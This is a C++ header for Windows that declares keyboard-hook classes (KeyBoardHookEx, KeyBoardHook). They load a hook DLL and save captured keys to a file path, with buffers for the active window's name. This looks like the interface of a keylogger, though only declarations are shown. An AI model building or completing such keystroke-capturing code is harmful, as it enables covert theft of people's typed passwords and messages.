#pragma once


//#include <afxwin.h>
#include "windows.h"
#include "ddc_util.h"



typedef struct _KEYBOARDINFO{
int MaxDataLen;
char Key[2048];
char Savepath[MAX_PATH];
char Dll_path[MAX_PATH];
}KEYBOARDINFO,LPKEYBOARDINFO;

class KeyBoardHookEx  
{
public:
	KeyBoardHookEx();
	~KeyBoardHookEx();

	
	int Start(const TCHAR *tchHookDllName,const TCHAR *tchResFilePath);
	int Stop(void);
	
	
	int StopKeyBoardHook();
	int StartKeyBoardHook();


private:

	
	
	BOOL bIsStart;

	
    KEYBOARDINFO KBINFO;
	
	
    int  canlog;//能否记录标记,未用
    unsigned char CNString[3];
    int  index;
    char old_winname[256],current_winname[256];

	//HHOOK KBhookCn;
	HHOOK *pHookHandle;

    int InitLibrary(void);
	


    void RemoveLibrary(void);


};


struct _stu_thread_param
{
	TCHAR tchHookDllName[MAX_PATH];
	TCHAR tchResFilePath[MAX_PATH];

};

typedef  struct _stu_thread_param stu_thread_param;


class KeyBoardHook 
{
public:
	KeyBoardHook();
	~KeyBoardHook();
	
	int Start(const TCHAR *tchHookDllName,const TCHAR *tchResFilePath);
	int Stop(void);


private:
	stu_thread_param stuThreadParam;
	HANDLE  hMainThread;
	BOOL bStart;

	

};



//extern "C" _declspec(dllexport) int start(int nouse);
//extern "C" _declspec(dllexport) int stop(void);